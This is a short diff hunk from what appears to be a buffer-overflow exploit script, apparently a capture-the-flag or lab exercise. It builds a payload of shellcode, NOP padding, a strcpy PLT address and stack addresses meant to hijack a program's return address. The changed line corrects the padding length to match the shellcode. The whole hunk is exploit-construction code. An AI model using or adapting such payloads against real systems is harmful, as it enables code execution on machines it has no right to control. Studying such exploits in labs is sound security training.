@@ -111,7 +111,7 @@ shellcode_addr = main_ret + 16
 buffer_addr = main_ret - 44
 
 payload = shellcode                     # buffer[40] + sfp
-payload = append("\x90"*(44-24))
+payload = append("\x90"*(44-len(shellcode)))
 payload = append(p32(strcpy_plt))       # ret
 payload = append("\x90"*4)              # padding
 payload = append(p32(main_ret+4))       # strcpy arg1
